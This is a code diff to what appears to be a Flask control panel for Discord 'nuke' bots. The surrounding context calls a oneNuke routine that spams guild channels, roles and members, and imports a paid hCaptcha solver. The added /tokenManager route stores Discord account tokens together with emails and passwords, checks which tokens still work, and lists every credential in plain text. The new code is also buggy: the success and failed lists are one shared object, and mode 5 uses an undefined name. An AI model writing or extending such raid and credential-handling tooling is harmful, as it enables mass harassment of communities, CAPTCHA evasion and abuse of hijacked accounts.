@@ -1,9 +1,11 @@
 import traceback, threading, requests, datetime, asyncio, aiohttp, discord, random, string, base64, json
 from flask import Flask, request, redirect, render_template
+from tokenManager import TokenManager
 from capmonster_python import HCaptchaTask
-from typing import Optional
 
 app = Flask(__name__)
+app.config['TEMPLATES_AUTO_RELOAD'] = True
+app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
 
 logs = {}
 logIdBotClass = {}
@@ -283,8 +285,7 @@ class DiscordBot(discord.Client):
                         await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
                         random.shuffle(self.channels)
                 else:
-                    for i in range(15):
-                        await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
+                    await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
         except:
             logs[self.logId] += f"-- Error ID:{self.user.id} --\n"+traceback.format_exc()+"\n"
         logs[self.logId] += f"---- End ID:{self.user.id} ----\n"
@@ -401,6 +402,56 @@ def stop():
         pass
     stops.append(logId)
     return redirect(request.referrer)
+
+@app.route("/tokenManager", methods=["GET", "POST"])
+def tokenManager():
+    tokenInfosStr = ""
+    manager = TokenManager("TOKEN")
+    if request.method == "POST":
+        token = request.form["token"]
+        email = request.form["email"]
+        password = request.form["password"]
+        etc = request.form["etc"]
+        mode = int(request.form["mode"])
+        if mode == 0:
+            manager.addToken(token, email, password, etc)
+        elif mode in [3,4]:
+            successTokenInfos = failedTokenInfos = []
+            for tokenInfo in manager.getTokenInfos():
+                apis = DiscordApis("n0nenu11", tokenInfo["token"])
+                userInfo = apis.getUserInfo()
+                if userInfo[0]:
+                    successTokenInfos.append(tokenInfo)
+                else:
+                    failedTokenInfos.append(tokenInfo)
+            tokenInfosStr += "===== Success Tokens =====\n"
+            for tokenInfo in successTokenInfos:
+                tokenInfosStr += f"""{tokenInfo["token"]}\n"""
+            tokenInfosStr += "\n===== Failed Tokens =====\n"
+            for tokenInfo in successTokenInfos:
+                tokenInfosStr += f"""{tokenInfo["token"]}\n"""
+            tokenInfosStr += "\n"
+            if mode == 4:
+                for i in range(len(manager.getTokenInfos())):
+                    manager.deleteToken(i)
+        elif mode == 5:
+            for i in failedTokenInfos:
+                manager.deleteToken(failedTokenInfos)
+        else:
+            no = int(request.form["no"])
+            if mode == 1:
+                manager.editToken(no, token, email, password, etc)
+            elif mode == 2:
+                manager.deleteToken(no)
+    manager = TokenManager("TOKEN")
+    tokenInfos = manager.getTokenInfos()
+    tokenInfosStr += "======== Tokens ========\n"
+    for tokenInfo in tokenInfos:
+        tokenInfosStr += f"""{tokenInfo["token"]}\n"""
+    tokenInfosStr += "\n===== Token Infos =====\n"
+    for i in range(len(tokenInfos)):
+        tokenInfosStr += f"""No. {i}\nToken: {tokenInfos[i]["token"]}\nEmail: {tokenInfos[i]["email"]}\nPassword:{tokenInfos[i]["password"]}\nEtc:{tokenInfos[i]["etc"]}\n\n"""
+    return render_template("tokenManager.html", tokens=tokenInfosStr)
 
 @app.route("/tokenChecker", methods=["GET", "POST"])
 def tokenChecker():
